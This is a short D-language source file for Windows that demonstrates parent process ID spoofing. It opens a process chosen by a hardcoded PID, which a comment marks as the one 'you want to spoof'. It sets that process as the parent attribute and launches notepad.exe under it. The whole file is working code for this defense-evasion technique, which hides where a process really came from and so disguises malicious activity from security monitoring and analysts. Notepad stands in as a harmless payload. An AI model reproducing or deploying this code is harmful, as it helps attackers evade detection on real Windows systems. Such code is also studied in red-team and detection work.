import core.sys.windows.windows;

pragma(lib, "kernel32");

struct PROC_THREAD_ATTRIBUTE_ENTRY {
    DWORD_PTR Attribute;
    SIZE_T cbSize;
    PVOID lpValue;
}

struct PROC_THREAD_ATTRIBUTE_LIST {
    DWORD dwFlags;
    ULONG Size;
    ULONG Count;
    ULONG Reserved;
    PULONG Unknown;
    PROC_THREAD_ATTRIBUTE_ENTRY[10] Entries;
}
alias LPPROC_THREAD_ATTRIBUTE_LIST = PROC_THREAD_ATTRIBUTE_LIST*;

struct STARTUPINFOEXA {
    STARTUPINFOA StartupInfo;
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
}

extern(Windows) BOOL InitializeProcThreadAttributeList(
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
    DWORD dwAttributeCount,
    DWORD dwFlags,
    PSIZE_T lpSize
);

extern(Windows) VOID DeleteProcThreadAttributeList(
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList
);

extern(Windows) BOOL UpdateProcThreadAttribute(
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
    DWORD dwFlags,
    DWORD_PTR Attribute,
    PVOID lpValue,
    SIZE_T cbSize,
    PVOID lpPreviousValue,
    PSIZE_T lpReturnSize
);

enum PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
enum EXTENDED_STARTUPINFO_PRESENT = 0x00080000;

void main()
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    INT pid = 1040; // change this to pid you want to spoof.

    ZeroMemory(&si, si.sizeof);
    HANDLE parentPhandle = OpenProcess(MAXIMUM_ALLOWED, false, pid);

    InitializeProcThreadAttributeList(null, 1, 0, &attributeSize);
    si.lpAttributeList = cast(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentPhandle, size_t(HANDLE.sizeof), null, null);
    si.StartupInfo.cb = si.sizeof;

    CreateProcessA("C:\\Windows\\System32\\notepad.exe", null, null, null, false, EXTENDED_STARTUPINFO_PRESENT, null, null, &si.StartupInfo, &pi);
}
